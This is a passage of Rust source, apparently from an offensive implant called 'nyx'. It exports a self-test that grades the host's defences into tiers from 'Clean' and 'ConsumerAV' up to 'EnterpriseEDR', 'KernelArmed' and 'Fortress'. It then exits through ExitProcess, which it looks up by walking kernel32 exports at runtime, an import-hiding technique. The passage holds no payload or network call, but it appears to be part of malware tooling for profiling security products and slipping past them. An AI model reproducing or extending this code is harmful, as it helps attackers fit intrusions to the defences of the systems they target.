        if (other as u8) > (self as u8) { other } else { self }
    }
}

// ---- Selftest support -----------------------------------------------------

/// Self-test: run T0-T3 assessment and report the tier.
/// Exit codes:
///   0xE0 + tier (0..4) = Clean/ConsumerAV/EnterpriseEDR/KernelArmed/Fortress
///   0xFF = assessment failed (Unknown)
#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_trex() -> ! {
    let assessment = assess_user_mode();
    let code = 0xE0u32 + (assessment.tier as u32);
    exit_process(code);
}

unsafe fn exit_process(code: u32) -> ! {
    let addr = crate::resolve::export_addr(b"kernel32.dll", b"ExitProcess")
        .or_else(|| crate::resolve::export_addr(b"kernelbase.dll", b"ExitProcess"));
    if let Some(a) = addr {
        type FnExit = unsafe extern "system" fn(u32) -> !;
        let f: FnExit = core::mem::transmute(a);
        f(code);
    }
    loop { core::hint::spin_loop(); }
}
